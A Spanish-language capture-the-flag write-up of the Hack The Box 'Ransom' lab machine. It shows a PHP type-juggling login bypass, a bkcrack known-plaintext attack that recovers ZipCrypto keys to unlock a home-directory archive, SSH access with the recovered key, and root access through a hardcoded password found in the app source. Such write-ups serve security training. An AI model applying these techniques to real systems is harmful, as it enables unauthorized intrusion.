---
layout: post
title: HTB Ransom
date: '2023-12-18 21:21:14 -0500'
categories: [HTB, Medium]
tags: [Web, Zip, Linux, TypeJuggling, SSH , API, HardcodeCreds ] 
image:
  path: /ransom/preview.png
  alt: Ransom
---

## Resumen

![logo](/ransom/logo.png){: .right w="200" h="200" }

**Ransom** fue una máquina bastante divertida. Se inicia con acceso a un sitio web donde solo hay un **inicio de sesión**, y al jugar con la solicitud, se logra realizar un **bypass** mediante un ataque de **type juggling**. Gracias a eso, se puede conseguir un archivo zip que contiene el directorio **home** de un usuario del sistema. Al investigar posibles ataques al **zip**, se encuentra que debido al método de cifrado, se puede realizar un ataque que permite crear una **copia idéntica** pero con una credencial designada por nosotros. Después, se hace uso de la llave **id_rsa** para conectarse a la máquina. Finalmente, se revisan los archivos del servidor para encontrar una **credencial hardcodeada**.

## Reconocimiento


Para comenzar, se realiza un **ping** para verificar la conectividad con la máquina.

```bash
ping -c 1 10.10.11.153
PING 10.10.11.153 (10.10.11.153) 56(84) bytes of data.
64 bytes from 10.10.11.153: icmp_seq=1 ttl=63 time=258 ms

--- 10.10.11.153 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
```
{: .nolineno}
## Escaneo de Puertos

Luego, se puede realizar un escaneo de puertos con **Nmap** para identificar cuáles puertos se encuentran abiertos.

```bash
nmap -p- --min-rate 2000 10.10.11.153 -Pn -oG ports

Nmap scan report for 10.10.11.153 (10.10.11.153)
Host is up (0.17s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```
{: .nolineno}

Con esa información, se puede llevar a cabo un escaneo más detallado para identificar qué servicios están en ejecución en cada uno de los puertos.

```bash
nmap -p22,80 -sVC 10.10.11.153 -Pn -oN versions

Nmap scan report for 10.10.11.153 (10.10.11.153)
Host is up (0.27s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 ea:84:21:a3:22:4a:7d:f9:b5:25:51:79:83:a4:f5:f2 (RSA)
|   256 b8:39:9e:f4:88:be:aa:01:73:2d:10:fb:44:7f:84:61 (ECDSA)
|_  256 22:21:e9:f4:85:90:87:45:16:1f:73:36:41:ee:3b:32 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
| http-title:  Admin - HTML5 Admin Template
|_Requested resource was http://10.10.11.153/login
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
{: .nolineno}


## Enumeración


Al acceder al sitio web, se observa un panel de inicio de sesión que solicita una contraseña.

![web](/ransom/web.png)


Además, se puede examinar las **tecnologías** que utiliza el sitio web utilizando la herramienta **WhatWeb**:

```bash
 whatweb http://10.10.11.153

http://10.10.11.153 [302 Found] Apache[2.4.41], Cookies[XSRF-TOKEN,laravel_session], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.10.11.153], Laravel, Meta-Refresh-Redirect[http://10.10.11.153/login], RedirectLocation[http://10.10.11.153/login], Title[Redirecting to http://10.10.11.153/login]

http://10.10.11.153/login [200 OK] Apache[2.4.41], Bootstrap, Cookies[XSRF-TOKEN,laravel_session], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.10.11.153], JQuery[1.9.1], Laravel, PasswordField[password], Script[text/javascript], Title[Admin - HTML5 Admin Template], X-UA-Compatible[IE=edge]
```
{: .nolineno}

Al interceptar la petición, se observa que la contraseña se está enviando a través del método **GET** en el parámetro **password**


![primerapeticion](/ransom/primerapeticion.png)

Por lo que se puede intentar cambiar el método a **POST** y poner el parámetro dentro del cuerpo de la petición, pero lamentablemente muestra que esta petición solo se puede enviar por **GET**.

![porpost](/ransom/porpost.png)


Se intenta enviar la información por **GET**, pero por el **body** de la petición, y se puede ver que dice que el parámetro **password** hace falta. Más sin embargo, se puede observar que la respuesta se da en formato **JSON**, por lo que podría intentar cambiarse el **content type**.

![getpost](/ransom/getpost.png)

Y al realizar los cambios dentro del body y dentro del content type, se puede ver que la petición fue interpretada de manera normal, dando pie a poder realizar algún ataque por este camino.


![validjson](/ransom/jsonvalid.png)




## Explotación Web

Después de varias pruebas, se encuentra que la aplicación **web** es vulnerable a un **type juggling**, donde se le puede asignar al valor de la **contraseña true** para que el condicional que realiza la validación lo tome como **verdadero**.


![bypass](/ransom/bypass.png)

Y luego de tramitar la **petición** de manera correcta, se gana acceso a un panel en donde se encuentra la **flag de usuario** y un archivo **zip** que parece contener el directorio **home** de uno de los **usuarios del sistema**.


![panel](/ransom/panel.png)

## Intrución

Al intentar descomprimir el archivo **.zip** se puede ver que es necesario tener una **contraseña** para poder ver el contenido, por lo que es necesario **crackear** la contraseña de alguna manera.


```bash
 unzip uploaded-file-3422.zip
Archive:  uploaded-file-3422.zip
[uploaded-file-3422.zip] .bash_logout password: 
password incorrect--reenter: %
```
{: .nolineno}


Con ayuda de 7z se puede ver la información del archivo y qué archivos trae dentro: 

```bash
 7z l uploaded-file-3422.zip

7-Zip [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
p7zip Version 16.02 (locale=en_US.UTF-8,Utf16=on,HugeFiles=on,64 bits,4 CPUs AMD Ryzen 5 5500U with Radeon Graphics          (860F81),ASM,AES-NI)

Scanning the drive for archives:
1 file, 7735 bytes (8 KiB)

Listing archive: uploaded-file-3422.zip

--
Path = uploaded-file-3422.zip
Type = zip
Physical Size = 7735

   Date      Time    Attr         Size   Compressed  Name
------------------- ----- ------------ ------------  ------------------------
2020-02-25 07:03:22 .....          220          170  .bash_logout
2020-02-25 07:03:22 .....         3771         1752  .bashrc
2020-02-25 07:03:22 .....          807          404  .profile
2021-07-02 13:58:14 D....            0            0  .cache
2021-07-02 13:58:14 .....            0           12  .cache/motd.legal-displayed
2021-07-02 13:58:19 .....            0           12  .sudo_as_admin_successful
2022-03-07 07:32:54 D....            0            0  .ssh
2022-03-07 07:32:25 .....         2610         1990  .ssh/id_rsa
2022-03-07 07:32:46 .....          564          475  .ssh/authorized_keys
2022-03-07 07:32:54 .....          564          475  .ssh/id_rsa.pub
2022-03-07 07:32:54 .....         2009          581  .viminfo
------------------- ----- ------------ ------------  ------------------------
2022-03-07 07:32:54              10545         5871  9 files, 2 folders
```
{: .nolineno}

Pero se puede revisar mucha más información haciendo uso del siguiente comando:

```bash
❯ 7z l -slt uploaded-file-3422.zip

7-Zip [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
p7zip Version 16.02 (locale=en_US.UTF-8,Utf16=on,HugeFiles=on,64 bits,4 CPUs AMD Ryzen 5 5500U with Radeon Graphics          (860F81),ASM,AES-NI)

Scanning the drive for archives:
1 file, 7735 bytes (8 KiB)

Listing archive: uploaded-file-3422.zip

--
Path = uploaded-file-3422.zip
Type = zip
Physical Size = 7735

----------
Path = .bash_logout
Folder = -
Size = 220
Packed Size = 170
Modified = 2020-02-25 07:03:22
Created = 
Accessed = 
Attributes = _ -rw-r--r--
Encrypted = +
Comment = 
CRC = 6CE3189B
Method = ZipCrypto Deflate
Host OS = Unix
Version = 20
Volume Index = 0

Path = .bashrc
Folder = -
Size = 3771
Packed Size = 1752
Modified = 2020-02-25 07:03:22
Created = 
Accessed = 
Attributes = _ -rw-r--r--
Encrypted = +
Comment = 
CRC = AB254644
Method = ZipCrypto Deflate
Host OS = Unix
Version = 20
Volume Index = 0

Path = .profile
Folder = -
Size = 807
Packed Size = 404
Modified = 2020-02-25 07:03:22
Created = 
Accessed = 
Attributes = _ -rw-r--r--
Encrypted = +
Comment = 
CRC = D1B22A87
Method = ZipCrypto Deflate
Host OS = Unix
Version = 20
Volume Index = 0

Path = .cache
Folder = +
Size = 0
Packed Size = 0
Modified = 2021-07-02 13:58:14
Created = 
Accessed = 
Attributes = D_ drwx------
Encrypted = -
Comment = 
CRC = 
Method = Store
Host OS = Unix
Version = 10
Volume Index = 0

Path = .cache/motd.legal-displayed
Folder = -
Size = 0
Packed Size = 12
Modified = 2021-07-02 13:58:14
Created = 
Accessed = 
Attributes = _ -rw-r--r--
Encrypted = +
Comment = 
CRC = 00000000
Method = ZipCrypto Store
Host OS = Unix
Version = 10
Volume Index = 0

Path = .sudo_as_admin_successful
Folder = -
Size = 0
Packed Size = 12
Modified = 2021-07-02 13:58:19
Created = 
Accessed = 
Attributes = _ -rw-r--r--
Encrypted = +
Comment = 
CRC = 00000000
Method = ZipCrypto Store
Host OS = Unix
Version = 10
Volume Index = 0

Path = .ssh
Folder = +
Size = 0
Packed Size = 0
Modified = 2022-03-07 07:32:54
Created = 
Accessed = 
Attributes = D_ drwxrwxr-x
Encrypted = -
Comment = 
CRC = 
Method = Store
Host OS = Unix
Version = 10
Volume Index = 0

Path = .ssh/id_rsa
Folder = -
Size = 2610
Packed Size = 1990
Modified = 2022-03-07 07:32:25
Created = 
Accessed = 
Attributes = _ -rw-------
Encrypted = +
Comment = 
CRC = 38804579
Method = ZipCrypto Deflate
Host OS = Unix
Version = 20
Volume Index = 0

Path = .ssh/authorized_keys
Folder = -
Size = 564
Packed Size = 475
Modified = 2022-03-07 07:32:46
Created = 
Accessed = 
Attributes = _ -rw-------
Encrypted = +
Comment = 
CRC = CB143C32
Method = ZipCrypto Deflate
Host OS = Unix
Version = 20
Volume Index = 0

Path = .ssh/id_rsa.pub
Folder = -
Size = 564
Packed Size = 475
Modified = 2022-03-07 07:32:54
Created = 
Accessed = 
Attributes = _ -rw-------
Encrypted = +
Comment = 
CRC = CB143C32
Method = ZipCrypto Deflate
Host OS = Unix
Version = 20
Volume Index = 0

Path = .viminfo
Folder = -
Size = 2009
Packed Size = 581
Modified = 2022-03-07 07:32:54
Created = 
Accessed = 
Attributes = _ -rw-------
Encrypted = +
Comment = 
CRC = 396B04B4
Method = ZipCrypto Deflate
Host OS = Unix
Version = 20
Volume Index = 0
```
{: .nolineno}

Con la información listada anteriormente, se puede concluir cuál es el posible vector de ataque. Sin embargo, para ello es necesario resaltar los puntos importantes para llegar al mismo:

- Se está utilizando el método de cifrado ZipCrypto, lo que indica que fue cifrado con una versión antigua de zip, ya que las versiones modernas utilizan AES.

- Hay un archivo que tiene el mismo peso que el que se encuentra en mi máquina local, es decir, **.bash_logout**, por lo que podría tener el mismo contenido

Para confirmar esto, se puede hacer uso del siguiente script:

```python
import binascii
with open('/home/kali/.bash_logout', 'rb') as f:
    data = f.read()
print(hex(binascii.crc32(data) & 0xFFFFFFFF))
```
{: .nolineno}



Y al ejecutarlo se puede ver que el valor de validación, es decir, el CRC, es el mismo para ambos archivos. Por lo tanto, se puede intuir que contienen lo mismo.

```bash
❯ python3 script.py
0x6ce3189b
```
{: .nolineno}

```bash
Path = .bash_logout
Folder = -
Size = 220
Packed Size = 170
Modified = 2020-02-25 07:03:22
Created = 
Accessed = 
Attributes = _ -rw-r--r--
Encrypted = +
Comment = 
CRC = 6CE3189B
Method = ZipCrypto Deflate
Host OS = Unix
Version = 20
Volume Index = 0
```
{: .nolineno}


Para poder realizar el ataque es necesario contar con la herramienta [bkcrack](https://github.com/kimci86/bkcrack) y seguir los siguientes pasos:


### Añadir a un Zip el archivo Conocido


Es necesario crear una copia del archivo dentro de la carpeta de trabajo para después comprimirla dentro de un archivo sin contraseña.

```bash
❯  zip conocido.zip .bash_logout
  adding: .bash_logout (deflated 28%)
```
{: .nolineno}

### Obtener las Llaves del Archivo 


Para obtener las llaves del archivo, es necesario usar los siguientes parámetros:

```bash
-C El zip cifrado 
-c El nombre del archivo conocido que se encuentra dentro del zip
-P El zip que fue creado por nosotros
-p El nombre del archivo  que se encuentra dentro del zip creado por nosotros
```

```bash    
❯ bkcrack-1.5.0-Linux/bkcrack -C uploaded-file-3422.zip -c .bash_logout -P conocido.zip -p .bash_logout
bkcrack 1.5.0 - 2022-07-07
[12:05:04] Z reduction using 151 bytes of known plaintext
100.0 % (151 / 151)
[12:05:04] Attack on 56903 Z values at index 6
Keys: 7b549874 ebc25ec5 7e465e18
75.5 % (42971 / 56903)
[12:06:23] Keys
7b549874 ebc25ec5 7e465e18
```
{: .nolineno}

### Crear un Zip Identico

Ahora, con estas, solo hace falta ejecutar el siguiente comando para crear una copia idéntica pero con la contraseña que nosotros deseamos:

```bash
❯ ./bkcrack-1.5.0-Linux/bkcrack -C archivoCifrado.zip -k keys -U archivoSalida.zip password
```
{: .nolineno}


```bash
❯ ./bkcrack-1.5.0-Linux/bkcrack -C uploaded-file-3422.zip -k 7b549874 ebc25ec5 7e465e18 -U cracked.zip htb123
bkcrack 1.5.0 - 2022-07-07
[12:10:09] Writing unlocked archive cracked.zip with password "htb123"
100.0 % (9 / 9)
Wrote unlocked archive.
```
{: .nolineno}

Ahora se puede descomprimir el archivo creado haciendo uso de la contraseña que se proporcionó, en este caso, **htb123**.

```bash
❯ unzip cracked.zip
Archive:  cracked.zip
[cracked.zip] .bash_logout password: htb123 
  inflating: .bash_logout            
  inflating: .bashrc                 
  inflating: .profile                
   creating: .cache/
 extracting: .cache/motd.legal-displayed  
 extracting: .sudo_as_admin_successful  
   creating: .ssh/
  inflating: .ssh/id_rsa             
  inflating: .ssh/authorized_keys    
  inflating: .ssh/id_rsa.pub         
  inflating: .viminfo
```
{: .nolineno}

Al revisarlo se puede ver que existe una llave **id_rsa**, la cual se puede utilizar para ganar acceso al host sin tener que saber la **contraseña**. Pero antes de eso, es necesario darle los permisos necesarios al archivo. Además, hay que revisar a qué usuario pertenece la llave.

Para darle los permisos a la id_rsa se puede usar **chmod**

```bash
❯ chmod 600 id_rsa
```
{: .nolineno}

Y para descubrir a qué usuario pertenece la llave, se puede revisar el archivo id_rsa.pub, ya que aquí viene el nombre del propietario.

```bash
cat id_rsa.pu id_rsa.pub 

ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDrDTHWkTw0RUfAyzj9U3Dh+ZwhOUvB4EewA+z6uSunsTo3YA0GV/j6EaOwNq6jdpNrb9T6tI+RpcNfA+icFj+
6oRj8hOa2q1QPfbaej2uY4MvkVC+vGac1BQFs6gt0BkWM9JY7nYJ2y0SIibiLDDB7TwOx6gem4Br/35PW2sel8cESyR7JfGjuauZM/DehjJJGfqmeuZ2Yd2Umr4
rAt0R4OEAcWpOX94Tp+JByPAT5m0CU557KyarNlW60vy79njr8DR8BljDtJ4n9BcOPtEn+7oYvcLVksgM4LB9XzdDiXzdpBcyi3+xhFznFKDYUf6NfAud2sEWae
7iIsCYtmjx6Jr9Zi2MoUYqWXSal8o6bQDIDbyD8hApY5apdqLtaYMXpv+rMGQP5ZqoGd3izBM9yZEH8d9UQSSyym/te07GrCax63tb6lYgUoUPxVFCEN4RmzW1V
uQGvxtfhu/rK5ofQPac8uaZskY3NWLoSF56BQqEG9waI4pCF5/Cq413N6/M= htb@ransom
```
{: .nolineno}

Con esto, se puede hacer uso de SSH para conectarse como el usuario htb: 

```bash
ssh -i id_rsa htb@10.10.11.153

Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-77-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

0 updates can be applied immediately.


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Mon Jul  5 11:34:49 2021
htb@ransom:~$ 
```
{: .nolineno}


## Escalada de Privilegios

Es una buena práctica revisar los archivos de configuración del **servidor Apache** y examinar los archivos en la **web** para identificar posibles configuraciones de **bases de datos** o contraseñas **hardcodeadas**. Esto podría proporcionar información sobre posibles rutas para **escalar privilegios.**



Al revisar el archivo **000-default.conf**, se observa que contiene la configuración de la ruta de la **página web**. Esto proporciona una pista para buscar información adicional en la misma y explorar posibles vectores de **ataque o rutas para escalar privilegios**.

```bash
<VirtualHost *:80>
	ServerAdmin webmaster@localhost
	DocumentRoot /srv/prod/public

	ErrorLog ${APACHE_LOG_DIR}/error.log
	CustomLog ${APACHE_LOG_DIR}/access.log combined
	   <Directory /srv/prod/public>
	      Options +FollowSymlinks
	      AllowOverride All
	      Require all granted
	   </Directory>

</VirtualHost>
```
{: .nolineno file="/etc/apache2/sites-available/000-default.conf"}



Al explorar la ruta /srv/prod/, se observa que contiene los archivos relacionados con la aplicación web.

```bash
ls /srv/prod/

README.md  artisan    composer.json  config    package.json  public     routes      storage  vendor
app        bootstrap  composer.lock  database  phpunit.xml   resources  server.php  tests    webpack.mix.js
```
{: .nolineno}


Para intentar revisar si se encuentra un archivo hardcodeado dentro de la comparación, o de dónde se está consumiendo la contraseña para pasar el inicio de sesión, se puede buscar entre todos los archivos el mensaje de error que se tenía dentro de la web: **Invalid Password**, utilizando el comando **grep**:


```bash
grep -r "Invalid Password" *

app/Http/Controllers/AuthController.php:        return "Invalid Password";
```
{: .nolineno}

Al revisar el archivo, se puede encontrar una contraseña que podría ser utilizada para conectarse como algún usuario.


```bash
cat app/Http/Controllers/AuthController.php
```
{: .nolineno}

```php
<?php

namespace App\Http\Controllers;

use App\Models\User;
use Illuminate\Http\Request;
use App\Http\Requests\RegisterRequest;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\Hash;



class AuthController extends Controller
{
    /**
     * Display login page.
     * 
     * @return \Illuminate\Http\Response
     */
    public function show_login()
    {
        return view('auth.login');
    }



    /**
     * Handle account login
     * 
     */
    public function customLogin(Request $request)
    {
        $request->validate([
            'password' => 'required',
        ]);

        if ($request->get('password') == "UHC-March-Global-PW!") {
            session(['loggedin' => True]);
            return "Login Successful";
        }
  
        return "Invalid Password";
    }

```
{: file="app/Http/Controllers/AuthController.php"}


Al probar esa contraseña para el usuario **root**, se logra obtener acceso como el mismo, por lo que se ha comprometido la máquina.


```bash
su  -
Password:UHC-March-Global-PW!
root@ransom:~# whoami
root
```
{: .nolineno}
